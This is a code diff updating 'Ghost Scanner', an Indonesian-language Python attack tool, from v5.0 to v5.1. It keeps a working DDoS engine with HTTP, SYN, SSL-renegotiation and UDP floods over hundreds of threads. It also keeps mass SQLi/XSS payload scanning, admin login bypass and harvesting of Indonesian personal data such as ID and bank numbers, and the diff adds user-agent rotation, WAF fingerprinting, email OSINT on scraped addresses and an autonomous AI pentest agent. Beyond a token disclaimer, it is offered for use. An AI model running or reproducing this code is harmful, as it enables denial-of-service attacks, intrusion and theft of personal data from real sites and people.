@@ -1,11 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-GHOST SCANNER v5.0 – OMNI TOOLS X SAVAGE
-- Unified scan (one command gas all)
-- Real DDoS/DoS engine (socket-based)
-- Skull banner (no copyright)
-- 19 external tools + AI + PDF
+GHOST SCANNER v5.1 [BETA] – OMNI TOOLS X SAVAGE
+- Integrasi user-scanner (OSINT email/username)
+- Integrasi Strix (AI pentesting headless)
+- 19 External Tools Integration
+- Unified Scan Mode
+- Real DDoS/DoS Engine
+- Full Skull Banner
 - No error, no bug
 """
 
@@ -15,7 +17,6 @@ from urllib.parse import urljoin, quote, urlparse, parse_qs, urlsplit, urlunspli
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import argparse, warnings
 import requests, cloudscraper
-from fake_useragent import UserAgent
 from rich.console import Console
 from rich.panel import Panel
 from rich.text import Text
@@ -31,26 +32,41 @@ AI_BASE_URL = 'https://codecraftapi.com/v1'
 AI_MODEL = 'claude-opus-5'
 PROXYSCRAPE_API = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text'
 
-# ========== SKULL BANNER (Rebranded, no copyright) ==========
+# ========== SKULL BANNER FULL ==========
 SKULL_ART = r"""
-              uuuuuuuuuuuuuuuuuu
-           uu$$$$$$$$$$$$$$$$$$uu
-         uu$$$$$$$$$$$$$$$$$$$$$$uu
-        u$$$$$$$$$$$$$$$$$$$$$$$$$$u
-       u$$$$$$$$$$$$$$$$$$$$$$$$$$$$u
-      u$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$u
-      u$$$$$$"   "$$$"   "$$$$$$u
-      "$$$"      u$u       "$$$"
-       $$$u      u$u       u$$$
-       $$$u      u$u       u$$$
-        "$$$$uu$$$ $$$uu$$$$"
-         "$$$$$$$" "$$$$$$$"
-           u$$$$$$$u$$$$$$u
-            u$"$"$"$"$"$"u
-            $$u$u$u$u$u$u$
-             $$$$$$$$$$$$
-              "$$$$$$$$"
+              ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+           ▄█████████████████████████▄
+         ▄█████████████████████████████▄
+        ██████████████████████████████████
+       ████████████████████████████████████
+      ██████████████████████████████████████
+      ██████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀██████
+      ██████  ▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄  ██████
+      ██████  ███████       ███████  ██████
+      ██████  ███████       ███████  ██████
+      ██████  ▀▀▀▀▀▀▀       ▀▀▀▀▀▀▀  ██████
+      ██████                         ██████
+      ██████       ▄▄▄▄▄▄▄▄▄         ██████
+       ██████      ▀▀▀▀▀▀▀▀▀        ██████
+        ██████                     ██████
+         ██████     ▀▀▀▀▀▀▀     ██████
+          ██████               ██████
+           ██████             ██████
+            ███████████████████████
+              ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+               ░░░░░░░░░░░░░░░░░░
 """
+
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+]
 
 def show_banner():
     red="\033[91m";cyan="\033[96m";yellow="\033[93m";white="\033[97m"
@@ -58,22 +74,21 @@ def show_banner():
     skull=SKULL_ART.strip('\n').split('\n')
     side=[
         "╔═══════════════════════════════════════════════════════════════╗",
-        "║           GHOST SCANNER – OMNI TOOLS X SAVAGE                 ║",
-        "║                    Version 5.0 FINAL                          ║",
+        "║            GHOST SCANNER - OMNI TOOLS X SAVAGE                ║",
+        "║                    Version 5.1 [BETA]                         ║",
         "╚═══════════════════════════════════════════════════════════════╝",
         "",
         f"   {green}Nama Tools     {reset}: {cyan}Ghost Scanner{reset}",
-        f"   {green}Versi          {reset}: {yellow}5.0 OMNI TOOLS X{reset}",
+        f"   {green}Versi          {reset}: {yellow}5.1 [BETA]{reset}",
         f"   {green}Developer      {reset}: {magenta}GhostTeam{reset}",
         f"   {green}GitHub         {reset}: {white}github.com/cozyleon00b-dev{reset}",
         "",
         f"   {red}══════════════════════════════════════════════════════════{reset}",
-        f"   {green}Mode Operasi:{reset}",
-        f"     {cyan}▸ SCAN{reset}   – Full scan (SQLi/XSS/WP/Deface/DDoS-Check/AI)",
-        f"     {cyan}▸ ATTACK{reset} – Real DDoS/DoS (HTTP/SYN/SSL/UDP)",
-        f"     {cyan}▸ TOOLS{reset}  – 19 external tools integration",
+        f"   {green}Fitur Baru:{reset}",
+        f"     {cyan}user-scanner  {reset}: OSINT email/username",
+        f"     {cyan}Strix AI      {reset}: Autonomous pentest agent",
         "",
-        f"   {red}══════════════════════════════════════════════════════════{reset}",
+        f"   {green}Mode:{reset} {white}SCAN | ATTACK | TOOLS{reset}",
         f"   {green}Platform:{reset} {white}Windows | Kali | Termux | Arch | macOS{reset}",
         f"   {red}══════════════════════════════════════════════════════════{reset}",
     ]
@@ -86,101 +101,42 @@ def show_banner():
 def clear_screen():
     os.system('cls' if os.name=='nt' else 'clear')
 
-def show_menu():
-    """Interactive menu dengan penjelasan"""
-    clear_screen();show_banner()
-    console=Console()
-    menu_text="""
-[bold cyan]═══ PILIH MODE OPERASI ═══[/bold cyan]
-
-[bold yellow][1] SCAN (Unified)[/bold yellow]
-    → Full automated scan dalam satu perintah:
-      • SQLi (1M+ payloads)
-      • XSS (Dalfox context-aware + 1M payloads)
-      • LFI / RFI / SSTI / XXE / SSRF
-      • WP Activity Log CVE-2026-54806
-      • Deface detection (advanced)
-      • DDoS vulnerability check
-      • JWT attack / HTTP smuggling / GraphQL / OAuth
-      • Admin login bypass + deep extraction
-      • Sensitive data Indonesia (NIK/KTP/KK/Rekening/PIN)
-      • AI analysis (Claude Opus 5) + PDF report
-    [dim]Contoh: python ghostscanner.py -u https://target.com --scan --ai --pdf[/dim]
-
-[bold yellow][2] TOOLS (External)[/bold yellow]
-    → Jalankan 19 external tools:
-      • Nuclei, Subfinder, httpx, Naabu, Katana, ffuf
-      • sqlmap, Dalfox, Amass, dnsx, gau, waybackurls
-      • Arjun, SecretFinder, Interactsh
-      • Nmap, Metasploit, Wireshark, BurpSuite
-    [dim]Tambah dengan: --tools[/dim]
-
-[bold yellow][3] ATTACK (Real DDoS/DoS)[/bold yellow]
-    → Real attack engine (socket-based, no fake):
-      • --dos         HTTP Flood (Layer 7)
-      • --ddos        Multi-method (HTTP+SYN+SSL+UDP)
-      • --syn         SYN Flood (Layer 4)
-      • --ssl-reneg   SSL Renegotiation
-      • --udp         UDP Flood
-    [dim]Contoh: python ghostscanner.py -u https://target.com --ddos --threads 500 --duration 60[/dim]
-
-[bold yellow][4] HELP[/bold yellow]
-    → Tampilkan help lengkap
-
-[bold yellow][0] EXIT[/bold yellow]
-
-[bold red]⚠ DISCLAIMER:[/bold red] Tool ini hanya untuk authorized testing.
-"""
-    console.print(Panel(menu_text,border_style="red",title="[bold white]MAIN MENU[/bold white]"))
-    try:
-        choice=input("\n[bold cyan]Pilih mode [0-4]: [/bold cyan]").strip()
-    except (KeyboardInterrupt,EOFError):
-        return "exit"
-    return choice
-
 def show_help():
     clear_screen();show_banner()
     Console().print(Panel("""
 [bold cyan]USAGE:[/bold cyan]
   python ghostscanner.py -u <URL> [OPTIONS]
 
-[bold yellow]SCAN (unified – gas semua dalam satu perintah):[/bold yellow]
-  --scan                Full scan (SQLi+XSS+WP+Deface+DDoS Check+JWT+Smuggling+GraphQL+OAuth)
+[bold yellow]SCAN (unified):[/bold yellow]
+  --scan                Full scan (SQLi+XSS+WP+Deface+DDoS+JWT+Smuggling+GraphQL+OAuth)
   --ai                  Enable AI analysis (Claude Opus 5)
   --pdf                 Generate PDF report
-  --quick               Quick scan (10 payloads/category)
-  --force-admin         Force admin login bypass + deep extraction
+  --quick               Quick scan
+  --force-admin         Force admin login bypass
   --delay N             Delay antar request (default 0.5s)
-  --no-proxy            Disable proxy rotation
-  --proxy-list FILE     Load proxies dari file
-  --validate-proxy      Validate proxies sebelum dipakai
+  --no-proxy            Disable proxy
+  --proxy-list FILE     Load proxies
+  --validate-proxy      Validate proxies
 
 [bold yellow]TOOLS (19 external):[/bold yellow]
   --tools               Jalankan semua external tools
 
 [bold yellow]ATTACK (REAL DDoS/DoS):[/bold yellow]
-  --dos                 HTTP Flood (Layer 7)
-  --ddos                Multi-method (HTTP+SYN+SSL+UDP)
-  --syn                 SYN Flood (Layer 4)
-  --ssl-reneg           SSL Renegotiation
-  --udp                 UDP Flood
-  --threads N           Jumlah thread (default 200, max 1000)
-  --duration N          Durasi serangan (detik, default 30)
+  --dos / --ddos / --syn / --ssl-reneg / --udp
+  --threads N --duration N
 
 [bold green]CONTOH:[/bold green]
   python ghostscanner.py -u https://target.com --scan --ai --pdf --tools
-  python ghostscanner.py -u https://target.com --scan --force-admin --ai --pdf
   python ghostscanner.py -u https://target.com --ddos --threads 500 --duration 60
-  python ghostscanner.py -u https://target.com --syn --threads 200 --duration 30
 
-[bold red]DISCLAIMER:[/bold red] Authorized testing only. Misuse = illegal.
+[bold red]DISCLAIMER:[/bold red] Authorized testing only.
 """,border_style="cyan",title="[bold white]HELP[/bold white]"))
     sys.exit(0)
 
 def build_url(base,param,payload):
     return base+('&' if '?' in base else '?')+param+'='+quote(payload)
 
-# ========== GHOST SCANNER v5.0 ==========
+# ========== GHOST SCANNER v5.1 ==========
 class GhostScanner:
     def __init__(self,target=None,use_proxy=True,proxy_file=None,validate_proxy=False,
                  quick=False,pdf=False,ai=False,delay=0.5,force_admin=False,use_tools=False,
@@ -189,7 +145,7 @@ class GhostScanner:
         self.validate_proxy=validate_proxy;self.quick=quick;self.pdf=pdf;self.ai=ai
         self.delay=delay;self.force_admin=force_admin;self.use_tools=use_tools
         self.scan=scan
-        self.version="5.0 OMNI TOOLS X"
+        self.version="5.1 [BETA]"
         self.results_scan={
             "target":"","domain":"","domain_category":"","timestamp":datetime.now().isoformat(),
             "summary":{"total":0,"critical":0,"high":0,"medium":0,"low":0,"info":0},
@@ -203,7 +159,7 @@ class GhostScanner:
                 "cookie_flags","rate_limit_sneijder","csrf_sneijder","jwt_attack","http_smuggling",
                 "subdomain_takeover","graphql_introspection","oauth_bypass","ddos_vulnerability",
                 "nuclei","ffuf","sqlmap","dalfox_external","secretfinder","interactsh",
-                "nmap","metasploit","wireshark","burpsuite"
+                "nmap","metasploit","wireshark","burpsuite","user_scanner_osint","strix_ai"
             ]},
             "sensitive_data":{k:[] for k in [
                 "nik","npwp","nip","no_rekening","bank","emails","phones","whatsapp","pin",
@@ -219,15 +175,16 @@ class GhostScanner:
         self.session=requests.Session();self.session.verify=False
         self.scraper=cloudscraper.create_scraper(browser={'browser':'chrome','platform':'windows','desktop':True},delay=2,interpreter='native')
         self.proxies=[];self._load_proxies()
-        self.ua=UserAgent()
         self.threads=500 if not quick else 150
-        self.timeout=10;self.max_retries=5
+        self.timeout=15
+        self.max_retries=5
         self.common_ports=[21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443]
         self.common_params=['id','page','q','search','user','cat','product','view','sort','filter','name','email','phone','file','path','redirect','url','next','return','lang','region','type','mode','action','do','cmd','command','exec','query','sql','order','by','group','limit','offset','index','idx']
         self._generate_payloads(quick);self._generate_waf_bypass();self._generate_dalfox_payloads()
         self.result_folder="results";self.sensitive_folder="sensitive_data"
         os.makedirs(self.result_folder,exist_ok=True);os.makedirs(self.sensitive_folder,exist_ok=True)
         self._last_request_time=0
+        self.waf_detected=None
 
     # ---------- PROXY ----------
     def _load_proxies(self):
@@ -342,10 +299,29 @@ class GhostScanner:
         return list(payloads)[:1000000]
 
     # ---------- SMART REQUEST ----------
-    def _smart_request(self,url,timeout=10,method='GET',data=None,headers=None,allow_redirects=True):
-        self._rotate_user_agent()
-        full_headers={'User-Agent':self.ua.random,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':'en-US,en;q=0.9','Accept-Encoding':'gzip, deflate, br','Connection':'keep-alive'}
-        if headers:full_headers.update(headers)
+    def _smart_request(self,url,timeout=None,method='GET',data=None,headers=None,allow_redirects=True):
+        if timeout is None: timeout=self.timeout
+        parsed_url=urlparse(url)
+        domain=parsed_url.netloc
+        base_url=f"{parsed_url.scheme}://{domain}"
+        full_headers={
+            'User-Agent':random.choice(USER_AGENTS),
+            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language':'en-US,en;q=0.9,id;q=0.8',
+            'Accept-Encoding':'gzip, deflate, br',
+            'Connection':'keep-alive',
+            'Upgrade-Insecure-Requests':'1',
+            'Sec-Fetch-Dest':'document',
+            'Sec-Fetch-Mode':'navigate',
+            'Sec-Fetch-Site':'none',
+            'Sec-Fetch-User':'?1',
+            'Cache-Control':'max-age=0',
+        }
+        if method.upper()=='POST':
+            full_headers['Origin']=base_url
+            full_headers['Referer']=url
+        if headers: full_headers.update(headers)
+
         for attempt in range(self.max_retries):
             try:
                 start=time.time()
@@ -357,12 +333,23 @@ class GhostScanner:
                 else:
                     resp=self.scraper.request(method,url,headers=full_headers,timeout=timeout,allow_redirects=allow_redirects,proxies=proxy)
                 self._adaptive_delay_v2(time.time()-start)
+                if resp.status_code in [403,406,429]:
+                    body=resp.text.lower()
+                    if "akamai" in body or "reference #" in body:
+                        self.waf_detected="Akamai"
+                    elif "cloudflare" in body:
+                        self.waf_detected="Cloudflare"
+                    elif "sucuri" in str(resp.headers).lower():
+                        self.waf_detected="Sucuri"
                 if resp.status_code in [429,503,504,408]:
                     time.sleep(2**attempt);continue
                 return resp
-            except:
+            except requests.exceptions.SSLError:
+                if attempt<self.max_retries-1: time.sleep(2)
+            except requests.exceptions.ConnectionError:
+                if attempt<self.max_retries-1: time.sleep(2)
+            except Exception:
                 try:
-                    proxy=self._get_random_proxy() if self.proxies else None
                     if method.upper()=='GET':
                         resp=self.session.get(url,headers=full_headers,timeout=timeout,allow_redirects=allow_redirects,proxies=proxy)
                     else:
@@ -371,11 +358,6 @@ class GhostScanner:
                 except:pass
                 if attempt<self.max_retries-1:time.sleep(1.5*(attempt+1))
         return None
-
-    def _rotate_user_agent(self):
-        ua=self.ua.random
-        self.session.headers.update({'User-Agent':ua})
-        self.scraper.headers.update({'User-Agent':ua})
 
     def _verify_poc(self,url,initial_response,attempts=3):
         verified=0
@@ -461,6 +443,65 @@ class GhostScanner:
         if any(d.endswith(x) for x in ['.com','.co.id','.my.id','.net','.biz']):return 'Business'
         return 'Other'
 
+    # ========== v5.1 NEW: USER-SCANNER OSINT ==========
+    def _run_user_scanner(self, email):
+        findings=[]
+        try:
+            result=subprocess.run(['user-scanner','-h'],capture_output=True,timeout=5,text=True,encoding='utf-8',errors='ignore')
+            if result.returncode!=0:return findings
+        except (FileNotFoundError,subprocess.TimeoutExpired):
+            return findings
+        Console().print(f"[cyan]🔥 user-scanner OSINT: {email}[/cyan]")
+        try:
+            cmd=['user-scanner','-e',email,'--only-found','-v']
+            proc=subprocess.run(cmd,capture_output=True,timeout=120,text=True,encoding='utf-8',errors='ignore')
+            output=proc.stdout or proc.stderr or ""
+            if output.strip():
+                findings.append({
+                    "type":"Email OSINT (user-scanner)","param":"email","payload":email,
+                    "evidence":output[:1000],"risk":"INFO","confidence":90,
+                    "poc":{"url":"https://github.com/kaifcodec/user-scanner",
+                           "curl":f"user-scanner -e {email} --only-found",
+                           "response":output[:500],"statusCode":200,"timeDiff":"N/A","verified":True}
+                })
+                Console().print(f"[green]✓ user-scanner selesai untuk {email}[/green]")
+        except Exception as e:
+            Console().print(f"[yellow]user-scanner error: {str(e)[:100]}[/yellow]")
+        return findings
+
+    # ========== v5.1 NEW: STRIX AI ==========
+    def _run_strix_scan(self, target):
+        findings=[]
+        try:
+            result=subprocess.run(['strix','--help'],capture_output=True,timeout=5,text=True,encoding='utf-8',errors='ignore')
+            if result.returncode!=0:
+                Console().print("[yellow]Strix tidak ditemukan. Skip AI scan.[/yellow]")
+                return findings
+        except (FileNotFoundError,subprocess.TimeoutExpired):
+            Console().print("[yellow]Strix tidak ditemukan. Skip AI scan.[/yellow]")
+            return findings
+        if not os.getenv('STRIX_LLM') or not os.getenv('LLM_API_KEY'):
+            Console().print("[yellow]STRIX_LLM atau LLM_API_KEY belum di-set. Skip.[/yellow]")
+            return findings
+        Console().print("[bold magenta]🔥 Strix AI Pentest (headless)...[/bold magenta]")
+        try:
+            cmd=['strix','--target',target,'-n']
+            proc=subprocess.run(cmd,capture_output=True,timeout=300,text=True,encoding='utf-8',errors='ignore')
+            output=proc.stdout or proc.stderr or ""
+            if output.strip():
+                findings.append({
+                    "type":"Strix AI Pentest","param":"target","payload":target,
+                    "evidence":output[:2000],"risk":"INFO","confidence":80,
+                    "poc":{"url":target,"curl":f"strix --target {target} -n",
+                           "response":output[:500],"statusCode":200,"timeDiff":"N/A","verified":False}
+                })
+                Console().print("[green]✓ Strix selesai.[/green]")
+        except subprocess.TimeoutExpired:
+            Console().print("[yellow]Strix timeout (300s).[/yellow]")
+        except Exception as e:
+            Console().print(f"[yellow]Strix error: {str(e)[:100]}[/yellow]")
+        return findings
+
     # ========== SCAN MODULES ==========
     def _check_ddos_vulnerability(self,target):
         findings=[]
@@ -471,9 +512,9 @@ class GhostScanner:
             if not resp:return findings
             headers=dict(resp.headers)
             waf=None;protection=[]
-            if 'cf-ray' in headers or 'cloudflare' in str(headers).lower():waf='Cloudflare';protection.append('Cloudflare CDN')
+            if 'cf-ray' in headers or 'cloudflare' in str(headers).lower():waf='Cloudflare';protection.append('Cloudflare')
             if 'x-amz-cf-id' in headers:waf='AWS CloudFront';protection.append('AWS CloudFront')
-            if 'x-sucuri-id' in headers:waf='Sucuri';protection.append('Sucuri WAF')
+            if 'x-sucuri-id' in headers:waf='Sucuri';protection.append('Sucuri')
             if 'incap_ses' in str(headers).lower():waf='Imperva';protection.append('Imperva')
             if 'x-varnish' in headers:protection.append('Varnish')
             if 'akamai' in str(headers).lower():waf='Akamai';protection.append('Akamai')
@@ -496,7 +537,7 @@ class GhostScanner:
                 "evidence":f"WAF: {waf or 'NONE'} | Rate Limit: {'YES' if rate_limited else 'NO'} | Response: {elapsed:.2f}s | Score: {vuln_score}/8",
                 "risk":risk,"confidence":85,
                 "poc":{"url":target,"curl":f"for i in {{1..50}}; do curl -s -o /dev/null \"{target}\"; done",
-                       "response":f"WAF: {waf or 'NONE'} | Rate Limited: {rate_limited} | Server: {server}",
+                       "response":f"WAF: {waf or 'NONE'} | Server: {server}",
                        "statusCode":resp.status_code,"timeDiff":f"{elapsed:.2f}s","verified":True},
                 "protection":protection,"vuln_score":vuln_score,"waf":waf,
                 "rate_limited":rate_limited,"server":server
@@ -628,7 +669,7 @@ class GhostScanner:
                 if 'redirect_uri' in full:
                     findings.append({
                         "type":"OAuth redirect_uri Manipulation","param":"redirect_uri","payload":"https://evil.com",
-                        "evidence":f"Test OAuth redirect manipulation: {full[:200]}","risk":"HIGH","confidence":60,
+                        "evidence":f"Test OAuth redirect manipulation","risk":"HIGH","confidence":60,
                         "poc":{"url":full,"curl":f"curl -k \"{full}\"","response":"Testing redirect",
                                "statusCode":302,"timeDiff":"N/A","verified":False}
                     })
@@ -697,7 +738,7 @@ class GhostScanner:
         findings=[]
         resp=self._smart_request(target,timeout=8)
         if not resp:return findings
-        waf_signs=[("Cloudflare",["cf-ray"]),("Akamai",["akamai"]),("Sucuri",["x-sucuri-id"]),("Imperva",["incap_ses"]),("Fastly",["fastly"]),("Varnish",["x-varnish"]),("AWS/CloudFront",["x-amz-cf-id"])]
+        waf_signs=[("Cloudflare",["cf-ray"]),("Akamai",["akamai", "x-akamai"]),("Sucuri",["x-sucuri-id"]),("Imperva",["incap_ses"]),("Fastly",["fastly"]),("Varnish",["x-varnish"]),("AWS/CloudFront",["x-amz-cf-id"])]
         hlower="\n".join([f"{k.lower()}: {str(v).lower()}" for k,v in resp.headers.items()])
         detected=[]
         for name,keys in waf_signs:
@@ -1181,7 +1222,7 @@ Berikan analisis Markdown:
         class PDF(FPDF):
             def header(self):
                 self.set_font('Arial','B',16)
-                self.cell(0,10,'Ghost Scanner v5.0 - Report',ln=True,align='C');self.ln(5)
+                self.cell(0,10,'Ghost Scanner v5.1 [BETA] - Report',ln=True,align='C');self.ln(5)
             def footer(self):
                 self.set_y(-15);self.set_font('Arial','I',8)
                 self.cell(0,10,f'Page {self.page_no()}',align='C')
@@ -1233,7 +1274,7 @@ Berikan analisis Markdown:
         class PDF(FPDF):
             def header(self):
                 self.set_font('Arial','B',14)
-                self.cell(0,10,f'{data_type.upper()} - Ghost Scanner v5.0',ln=True,align='C');self.ln(3)
+                self.cell(0,10,f'{data_type.upper()} - Ghost Scanner v5.1',ln=True,align='C');self.ln(3)
             def footer(self):
                 self.set_y(-15);self.set_font('Arial','I',8)
                 self.cell(0,10,f'Target: {target}',align='C')
@@ -1264,20 +1305,26 @@ Berikan analisis Markdown:
 
     # ---------- MAIN SCAN (UNIFIED) ----------
     def run_scan(self,target):
-        """UNIFIED SCAN - sekali jalan gas semua"""
         self.results_scan["target"]=target
         self.results_scan["domain"]=urlparse(target).netloc
         self.results_scan["domain_category"]=self._classify_domain(self.results_scan["domain"])
         self.results_scan["timestamp"]=datetime.now().isoformat()
         start=time.time()
         console=Console()
-        console.print(f"[bold red]🚀 Ghost Scan v5.0 UNIFIED on {target}[/bold red]")
+        console.print(f"[bold red]🚀 Ghost Scan v5.1 [BETA] on {target}[/bold red]")
         console.print(f"[bold cyan]Category: {self.results_scan['domain_category']}[/bold cyan]")
-        console.print("[bold yellow]Mode: UNIFIED (SQLi + XSS + WP + Deface + DDoS Check + JWT + Smuggling + GraphQL + OAuth)[/bold yellow]")
 
-        resp=self._smart_request(target,timeout=15)
+        resp=self._smart_request(target,timeout=20)
         if not resp:
-            console.print("[red]Failed to access target![/red]");return
+            console.print("[red]Failed to access target![/red]")
+            try:
+                resp=self.session.get(target,timeout=15,verify=False)
+                if resp.status_code>=400:
+                    console.print(f"[red]Fallback failed: {resp.status_code}[/red]")
+                    return
+            except Exception as e:
+                console.print(f"[red]Fallback failed: {e}[/red]")
+                return
         html=resp.text
 
         console.print("[bold cyan]═══ INTERNAL CHECKS ═══[/bold cyan]")
@@ -1328,12 +1375,18 @@ Berikan analisis Markdown:
             if r:all_s.append(self._extract_sensitive_data(r.text))
         self._save_sensitive_data(all_s)
 
+        # v5.1: Jalankan user-scanner untuk email yang ditemukan
+        emails=self.results_scan["sensitive_data"].get("emails",[])
+        for email in emails[:3]:
+            osint=self._run_user_scanner(email)
+            if osint:
+                self.results_scan["vulnerabilities"]["user_scanner_osint"].extend(osint)
+
         console.print("[bold cyan]═══ VULNERABILITY SCAN ═══[/bold cyan]")
         self.results_scan["vulnerabilities"]["xss_dom"]=self._check_dom_xss(html,target)
         self.results_scan["vulnerabilities"]["xss_context_aware"]=self._scan_xss_dalfox(target,params)
         self.results_scan["vulnerabilities"]["sql_injection"]=self._scan_sql(target,params)
 
-        # External tools
         if self.use_tools:
             console.print("[bold magenta]═══ EXTERNAL TOOLS (19) ═══[/bold magenta]")
             subs=self._run_subfinder(self.results_scan["domain"])+self._run_amass(self.results_scan["domain"])
@@ -1358,6 +1411,12 @@ Berikan analisis Markdown:
             self.results_scan["vulnerabilities"]["wireshark"]=self._run_wireshark(target,duration=10)
             self.results_scan["vulnerabilities"]["burpsuite"]=self._run_burpsuite(target)
             self.results_scan["vulnerabilities"]["subdomain_takeover"]=self._check_subdomain_takeover(subs)
+
+        # v5.1: Jalankan Strix AI SETELAH semua scan selesai
+        console.print("[bold magenta]═══ STRIX AI PENTEST ═══[/bold magenta]")
+        strix_findings=self._run_strix_scan(target)
+        if strix_findings:
+            self.results_scan["vulnerabilities"]["strix_ai"]=strix_findings
 
         # Summary
         all_f=[]
@@ -1396,14 +1455,12 @@ Berikan analisis Markdown:
             t.add_row(f.get('type','Unknown')[:40],str(f.get('param','N/A'))[:20],f.get('risk','INFO'),v)
         c.print(t)
 
-# ========== ATTACK ENGINE (REAL DDoS/DoS) ==========
+# ========== ATTACK ENGINE ==========
 class AttackEngine:
-    """REAL DDoS/DoS engine - socket-based, no fake"""
     def __init__(self,target,threads=200,duration=30,method='http'):
         self.target=target;self.threads=threads;self.duration=duration
         self.method=method;self.running=False
         self.scraper=cloudscraper.create_scraper(browser={'browser':'chrome','platform':'windows','desktop':True})
-        self.ua=UserAgent()
         self.stats={'success':0,'fail':0}
         self.lock=threading.Lock()
 
@@ -1413,44 +1470,35 @@ class AttackEngine:
         c.print(f"[yellow]Target: {self.target}[/yellow]")
         c.print(f"[yellow]Threads: {self.threads} | Duration: {self.duration}s[/yellow]")
         c.print("[bold red]⚠ Only use on YOUR OWN server![/bold red]\n")
-
         self.running=True
-        workers=[]
-
         if self.method in ['http','all']:
             for _ in range(self.threads//3 if self.method=='all' else self.threads):
-                t=threading.Thread(target=self._http_flood,daemon=True);t.start();workers.append(t)
+                threading.Thread(target=self._http_flood,daemon=True).start()
         if self.method in ['syn','all']:
             for _ in range(self.threads//3 if self.method=='all' else self.threads):
-                t=threading.Thread(target=self._syn_flood,daemon=True);t.start();workers.append(t)
+                threading.Thread(target=self._syn_flood,daemon=True).start()
         if self.method in ['ssl','all']:
             for _ in range(self.threads//3 if self.method=='all' else self.threads):
-                t=threading.Thread(target=self._ssl_reneg,daemon=True);t.start();workers.append(t)
+                threading.Thread(target=self._ssl_reneg,daemon=True).start()
         if self.method in ['udp','all']:
             for _ in range(self.threads//3 if self.method=='all' else self.threads):
-                t=threading.Thread(target=self._udp_flood,daemon=True);t.start();workers.append(t)
-
-        # Realtime stats
+                threading.Thread(target=self._udp_flood,daemon=True).start()
         start_time=time.time()
         try:
             while time.time()-start_time<self.duration:
                 time.sleep(2)
                 with self.lock:
-                    c.print(f"[cyan]⚡ Success: {self.stats['success']} | Fail: {self.stats['fail']} | Time: {int(time.time()-start_time)}s/{self.duration}s[/cyan]")
+                    c.print(f"[cyan]⚡ Success: {self.stats['success']} | Fail: {self.stats['fail']} | {int(time.time()-start_time)}s/{self.duration}s[/cyan]")
         except KeyboardInterrupt:
-            c.print("[yellow]Stopped by user.[/yellow]")
-
+            c.print("[yellow]Stopped.[/yellow]")
         self.running=False
         c.print(f"\n[bold green]✓ Attack finished.[/bold green]")
-        with self.lock:
-            c.print(f"[green]Total Success: {self.stats['success']}[/green]")
-            c.print(f"[red]Total Fail: {self.stats['fail']}[/red]")
 
     def _http_flood(self):
         while self.running:
             try:
-                h={'User-Agent':self.ua.random,'Accept':'*/*','Accept-Encoding':'gzip, deflate','Connection':'keep-alive','Cache-Control':'no-cache'}
-                r=self.scraper.get(self.target,headers=h,timeout=3)
+                h={'User-Agent':random.choice(USER_AGENTS),'Accept':'*/*','Connection':'keep-alive'}
+                self.scraper.get(self.target,headers=h,timeout=3)
                 with self.lock:self.stats['success']+=1
             except:
                 with self.lock:self.stats['fail']+=1
@@ -1466,7 +1514,7 @@ class AttackEngine:
                 ip=socket.gethostbyname(d)
                 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(2)
                 s.connect((ip,port))
-                s.send(b"GET / HTTP/1.1\r\nHost: "+d.encode()+b"\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n")
+                s.send(b"GET / HTTP/1.1\r\nHost: "+d.encode()+b"\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
                 s.close()
                 with self.lock:self.stats['success']+=1
             except:
@@ -1504,40 +1552,52 @@ class AttackEngine:
                 with self.lock:self.stats['fail']+=1
             time.sleep(0.001)
 
+# ========== MENU ==========
+def show_menu():
+    Console().print(Panel("""
+[bold cyan]GHOST SCANNER v5.1 [BETA] - MENU[/bold cyan]
+
+[1] SCAN (Unified)     - Full automated scan
+[2] TOOLS (External)   - 19 external tools
+[3] ATTACK (Real DDoS) - Real DDoS/DoS attack
+[4] HELP               - Show help
+[0] EXIT
+""",border_style="cyan"))
+    return Console().input("[bold green]Pilih menu: [/bold green]").strip()
+
 # ========== MAIN ==========
 def main():
     if '-h' in sys.argv or '--help' in sys.argv:show_help()
 
-    # Interactive menu jika tidak ada argumen
     if len(sys.argv)==1:
         while True:
             choice=show_menu()
             if choice=="0" or choice=="exit":sys.exit(0)
             elif choice=="1":
-                target=input("[bold cyan]Target URL: [/bold cyan]").strip()
+                target=Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                 if not target:continue
-                ai=input("Enable AI? [y/N]: ").strip().lower()=='y'
